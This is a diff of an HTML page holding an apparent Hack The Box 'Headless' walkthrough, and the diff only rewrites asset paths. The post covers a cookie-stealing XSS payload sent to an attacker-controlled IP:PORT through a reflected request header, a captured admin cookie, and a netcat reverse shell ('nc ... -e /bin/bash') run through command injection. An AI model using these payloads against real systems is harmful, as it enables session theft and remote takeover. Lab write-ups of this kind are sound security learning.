@@ -4,7 +4,7 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>HTB Headless Guide</title>
-  <link rel="stylesheet" href="/static/css/styles.css"/>
+  <link rel="stylesheet" href="static/css/styles.css"/>
 </head>
 <body>
   <div class="container">
@@ -14,13 +14,13 @@
         <span class="date">2024-05-17</span> —
         <span class="tags"><span class="tag">HTB</span><span class="tag">XSS</span><span class="tag">cookies</span></span>
       </div>
-      <img class="post-banner" src="/static/images/htb_headless_guide_banner.png" alt="Imagem do post"/>
+      <img class="post-banner" src="static/images/htb_headless_guide_banner.png" alt="Imagem do post"/>
     </header>
     <article class="post-body">
       <p>Headless is a Hack The Box machine that has a website that notify us that it is under construction, by enumerating the directories we can find a directory called support, where we can send some tickets and suggestions to the page, there we can use an interesting behavior of the page to exploit a XSS vulnerability to steal some cookies. Then we will have access to an admin page called dashboard, there we can use a remote code execution to get a shell on the machine. The privilege escalation part we can use a file that we have permission to write on and the file can be executed as sudo.</p>
 <h2>Info</h2>
 <p>The information provided on this site is intended for educational purposes only. While we strive to offer accurate and up-to-date content regarding hacking and security, we cannot be held responsible for any misuse or illegal activity conducted with the knowledge gained from this site. Users are solely responsible for their actions and should use this information ethically and within the boundaries of the law.
-<img alt="Headless.png|600" src="/static/images/htb_headless_guide_1.png|600"/></p>
+<img alt="Headless.png|600" src="static/images/htb_headless_guide_1.png|600"/></p>
 <h2>Nmap Scan</h2>
 <p>As usual, we can start with a nmap scan.</p>
 <pre><code>┌──(kali㉿atropos)-[~/htb/machines/headless]
@@ -148,9 +148,9 @@ DOWNLOADED: 4612 - FOUND: 2
 <p>We found the page <code>/dashboard</code> that returned code 500, but trying to access that page on the browser, we can see that we don't have the right permissions to access that page, we need to remember that down the line if we get access to some admin cookies.</p>
 <h2>Web Application</h2>
 <p>When we get on the home directory, we see that the site is under construction and will be released in 25 days.
-<img alt="headless_homepage.png" src="/static/images/htb_headless_guide_2.png"/>
+<img alt="headless_homepage.png" src="static/images/htb_headless_guide_2.png"/>
 On our directory enumeration we found a page called <code>/suport</code>, we can take a look on it.
-<img alt="headless_form.png" src="/static/images/htb_headless_guide_3.png"/>
+<img alt="headless_form.png" src="static/images/htb_headless_guide_3.png"/>
 Here we can see multiple input fields, so we can try some XSS, same as in the [[IClean]], we can use this payload:</p>
 <pre><code>&lt;img src=x onerror=fetch("http://IP:PORT/"+document.cookie);&gt;
 </code></pre>
@@ -158,12 +158,12 @@ Here we can see multiple input fields, so we can try some XSS, same as in the [[
 <p>We can also find many others XSS payloads in <a href="https://github.com/payloadbox/xss-payload-list">this</a> GitHub repository.</p>
 </blockquote>
 <p>Here we can use <code>Burpsuite</code> to capture the request and change the fields as we want, in this case we can use the payload on the message field:
-<img alt="headless_XSS1.png" src="/static/images/htb_headless_guide_4.png"/>
+<img alt="headless_XSS1.png" src="static/images/htb_headless_guide_4.png"/>
 But there is a problem, when we do this we get a Hacking Attempt Detected :o
-<img alt="headless_hacking_detected.png" src="/static/images/htb_headless_guide_5.png"/></p>
+<img alt="headless_hacking_detected.png" src="static/images/htb_headless_guide_5.png"/></p>
 <center><iframe allowfullscreen="" class="giphy-embed" frameborder="0" height="266" src="https://giphy.com/embed/jmSjPi6soIoQCFwaXJ" width="480"></iframe><p><a href="https://giphy.com/gifs/cbs-swat-shemar-moore-cbs-jmSjPi6soIoQCFwaXJ">via GIPHY</a></p></center>
 <p>But we can use this to our advantage, notice the Client Request Information, this is reflecting out request header, so, we can purposefully use this message and insert the XSS payload on the header, that way, if it is not sanitized as the input fields on the page we will get out XSS properly executed, and even better, we will have a better chance for it to be seeing by a admin.
-<img alt="headless_XSS_reflect_head.png" src="/static/images/htb_headless_guide_6.png"/>
+<img alt="headless_XSS_reflect_head.png" src="static/images/htb_headless_guide_6.png"/>
 Now we can use the same payload again and place it on the message input on the POST request, but this time we can place it on any of the header parameters. That way, as we can see, our XSS is reflected to the page. To actually steal the cookies, we need to setup a http server on our machine, for this we can use python with the command <code>python3 -m http.server 8081</code>:</p>
 <pre><code>┌──(kali㉿atropos)-[~]
 └─$ python3 -m http.server 8081
@@ -174,7 +174,7 @@ Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 <p>Now we have the cookie <code>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code>, we can directly place this on our browser, or we change it on <code>Burpsuite</code>, in this case I will place it on the browser, is more convenient that way.</p>
 <h2>Getting a Shell</h2>
 <p>Now we can go to the <code>/dashboard</code> page and see what we can use there. On the page we have a simple page with a button to generate a health report of the site, on this we use a parameter date to do some stuff on the server. This looks like it's vulnerable to command injection. In this case I think the machine was working strange after someone tinkered with it in some weird way and the bash reverse shell was not working, so I used the <code>netcat</code> reverse shell, <code>nc 10.10.14.200 9001 -e /bin/bash</code>:
-<img alt="headless_reverse_shell.png" src="/static/images/htb_headless_guide_7.png"/>
+<img alt="headless_reverse_shell.png" src="static/images/htb_headless_guide_7.png"/>
 We can set up a <code>netcat</code> listener on our end to catch that connection, and with that we have shell access, and we can get our user flag:</p>
 <pre><code>bash-5.2$ cd /home
 bash-5.2$ ls
